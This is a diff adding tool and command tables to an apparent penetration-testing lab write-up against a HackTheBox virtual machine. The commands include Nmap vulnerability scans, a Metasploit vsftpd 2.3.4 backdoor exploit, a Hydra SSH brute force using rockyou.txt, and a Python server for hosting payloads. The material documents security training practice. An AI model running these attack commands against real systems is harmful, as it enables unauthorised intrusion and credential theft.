@@ -1,1 +1,24 @@
+##Tools Used
+Tool	          Purpose                     	Platform
+Kali Linux	   	Penetration testing OS    	  Linux
+Metasploit    	Exploitation framework	      CLI/GUI
+OpenVAS		      Vulnerability scanning	      Web-based
+Burp Suite Pro	Web application testing	      Cross-platform
+Nmap		        Network discovery & scanning	CLI
+Hydra		        Credential brute-forcing	    CLI
+John the Ripper Password cracking           	CLI
+HackTheBox VM 	Target environment	          Virtual Machine
 
+
+##Commands Used
+Tool	      Command	                                           Purpose
+Nmap       	nmap -sS -sV -O -p- 192.168.1.200                  Full TCP port scan
+Nmap	      nmap --script vuln 192.168.1.200	                 Vulnerability scan
+Metasploit	msfconsole	                                       Start framework
+Metasploit	use exploit/unix/ftp/vsftpd_234_backdoor	         Load VSFTPD exploit
+Metasploit	set RHOSTS 192.168.1.200	                         Set target IP
+Metasploit	exploit	                                           Execute exploit
+OpenVAS    	gvm-cli socket --xml "<get_tasks/>"                List scan task
+Burp Suite	Proxy → Intercept → Enable	                       Start interception
+Hydra	      hydra -l admin -P rockyou.txt ssh://192.168.1.200	 SSH brute force
+System	    python3 -m http.server 80	                         Host payload/scripts
